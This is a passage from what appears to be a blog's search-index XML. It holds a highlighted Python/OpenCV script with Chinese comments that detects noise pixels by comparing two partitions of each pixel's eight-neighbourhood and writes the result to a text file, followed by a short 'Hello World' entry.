class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解释器：anaconda3/python3.8</span></span><br><span class="line"><span class="comment"># 编译器：pycharm</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建管理像素噪声值及分区的结构体</span></span><br><span class="line">Pixel_type = np.dtype(&#123;</span><br><span class="line">    <span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;noise&#x27;</span>, <span class="string">&#x27;part&#x27;</span>],  <span class="comment"># value像素值，noise噪声值，part分区（1/2）</span></span><br><span class="line">    <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断区分度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge_division_degree</span>(<span class="params">array</span>):</span></span><br><span class="line">    p1 = []</span><br><span class="line">    p2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(array)):</span><br><span class="line">        <span class="keyword">if</span> array[i][<span class="string">&#x27;part&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">            p1.append(array[i][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">        <span class="keyword">elif</span> array[i][<span class="string">&#x27;part&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">            p2.append(array[i][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    <span class="comment"># 防止列表为空</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p1) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(p2) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    expected_degree = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">min</span>(p2) - <span class="built_in">max</span>(p1) &lt;= expected_degree:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分方法一（不考虑位置）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division_method1</span>(<span class="params">array</span>):</span></span><br><span class="line">    <span class="comment"># 使p数组为有序集(p数组为一维数组，无需考虑轴)</span></span><br><span class="line">    p = np.sort(array, order=<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="comment"># p1为p中相邻两数之差的数组</span></span><br><span class="line">    p1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p) - <span class="number">1</span>):</span><br><span class="line">        p1.append(p[i + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - p[i][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    <span class="comment"># 找出最大差值的下标</span></span><br><span class="line">    max_index = p1.index(<span class="built_in">max</span>(p1))</span><br><span class="line">    <span class="comment"># 建立较小数下标不重复数组</span></span><br><span class="line">    small_indexs = <span class="built_in">list</span>(<span class="built_in">set</span>(heapq.nsmallest(max_index + <span class="number">1</span>, p[<span class="string">&#x27;value&#x27;</span>])))</span><br><span class="line">    <span class="comment"># 将较小数划分到区域一，标记为“1”，反之，标记仍为“0”的在区域二</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(small_indexs)):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(array)):</span><br><span class="line">            <span class="keyword">if</span> small_indexs[m] == array[n][<span class="string">&#x27;value&#x27;</span>]:</span><br><span class="line">                array[n][<span class="string">&#x27;part&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 返回被标记好的数组</span></span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分方法二（考虑位置）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division_method2</span>(<span class="params">array</span>):</span></span><br><span class="line">    <span class="comment"># 建立数组p，存放顺时针方向像素的差值(前 - 后)</span></span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(array) - <span class="number">1</span>):</span><br><span class="line">        p.append(array[i][<span class="string">&#x27;value&#x27;</span>] - array[i + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    p.append(array[-<span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - array[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    min_index = p.index(<span class="built_in">min</span>(p))</span><br><span class="line">    max_index = p.index(<span class="built_in">max</span>(p))</span><br><span class="line">    <span class="comment"># 始终将较小部分的数标记为1</span></span><br><span class="line">    <span class="keyword">if</span> min_index &gt; max_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index, min_index + <span class="number">1</span>):</span><br><span class="line">            array[i][<span class="string">&#x27;part&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> min_index &lt; max_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p)):</span><br><span class="line">            array[i][<span class="string">&#x27;part&#x27;</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index, max_index + <span class="number">1</span>):</span><br><span class="line">            array[i][<span class="string">&#x27;part&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 返回被标记好的数组</span></span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查噪声点，传入的参数为单色图像通道</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">image_channel</span>):</span></span><br><span class="line">    <span class="comment"># 锁定图像边界</span></span><br><span class="line">    (x, y) = image_channel.shape</span><br><span class="line">    <span class="comment"># 建立二维通道数组</span></span><br><span class="line">    b = np.zeros((x, y), dtype=Pixel_type)</span><br><span class="line">    <span class="comment"># 先建立数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">            <span class="comment"># 存入像素值，并初始化噪声值和分区</span></span><br><span class="line">            b[i][j] = (image_channel[i][j], <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 因为接下来的操作需要提取一个个完整的九宫格</span></span><br><span class="line">    <span class="comment"># 所以遍历像素点时，图像最边缘的像素点永不成为中心像素点</span></span><br><span class="line">    <span class="comment"># 即：从1开始到最大值-1结束</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, x - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, y - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 建立八邻域的数组，围绕中心像素点，按顺时针标记八个像素点</span></span><br><span class="line">            eight_neighbor1 = np.zeros(<span class="number">8</span>, dtype=Pixel_type)</span><br><span class="line">            eight_neighbor1[<span class="number">0</span>] = b[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">1</span>] = b[i - <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor1[<span class="number">2</span>] = b[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">3</span>] = b[i][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">4</span>] = b[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">5</span>] = b[i + <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor1[<span class="number">6</span>] = b[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">7</span>] = b[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 划分方法一</span></span><br><span class="line">            eight_neighbor_division1 = division_method1(eight_neighbor1)</span><br><span class="line">            <span class="comment"># 建立八邻域的数组，围绕中心像素点，按顺时针标记八个像素点</span></span><br><span class="line">            eight_neighbor2 = np.zeros(<span class="number">8</span>, dtype=Pixel_type)</span><br><span class="line">            eight_neighbor2[<span class="number">0</span>] = b[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">1</span>] = b[i - <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor2[<span class="number">2</span>] = b[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">3</span>] = b[i][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">4</span>] = b[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">5</span>] = b[i + <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor2[<span class="number">6</span>] = b[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">7</span>] = b[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 划分方法二</span></span><br><span class="line">            eight_neighbor_division2 = division_method2(eight_neighbor2)</span><br><span class="line">            <span class="comment"># 判断区分度</span></span><br><span class="line">            <span class="keyword">if</span> judge_division_degree(eight_neighbor_division1) <span class="keyword">and</span> \</span><br><span class="line">                    judge_division_degree(eight_neighbor_division2):</span><br><span class="line">                <span class="comment"># 找出划分区域不一样的像素点</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> eight_neighbor_division1[k][<span class="string">&#x27;part&#x27;</span>] != eight_neighbor_division2[k][<span class="string">&#x27;part&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">                            b[i - <span class="number">1</span>][j - <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">1</span>:</span><br><span class="line">                            b[i - <span class="number">1</span>][j][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">2</span>:</span><br><span class="line">                            b[i - <span class="number">1</span>][j + <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">3</span>:</span><br><span class="line">                            b[i][j + <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">4</span>:</span><br><span class="line">                            b[i + <span class="number">1</span>][j + <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">5</span>:</span><br><span class="line">                            b[i + <span class="number">1</span>][j][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">6</span>:</span><br><span class="line">                            b[i + <span class="number">1</span>][j - <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">7</span>:</span><br><span class="line">                            b[i][j - <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以BGR方式读入图片</span></span><br><span class="line">img = cv.imread(<span class="string">&#x27;test3.png&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 检查读入是否成功</span></span><br><span class="line"><span class="comment"># print(img.shape)</span></span><br><span class="line"><span class="comment"># 输出(302, 302, 3)，代表成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆分图像通道</span></span><br><span class="line">B, G, R = cv.split(img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 noise_check() 函数，检查可能的噪声点</span></span><br><span class="line">b_px = noise_check(B)  <span class="comment"># 以B通道举例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在output。txt文件下输出噪声值的矩阵排布</span></span><br><span class="line">pf = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">302</span>):</span><br><span class="line">    <span class="keyword">for</span> j1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">302</span>):</span><br><span class="line">        <span class="built_in">print</span>(b_px[i1][j1][<span class="string">&#x27;noise&#x27;</span>], end=<span class="string">&#x27;&#x27;</span>, file=pf)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>, file=pf)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;导出成功&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/1970/01/01/hello-world/"/>
      <url>/1970/01/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110251233406.png" alt="p2684995706"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
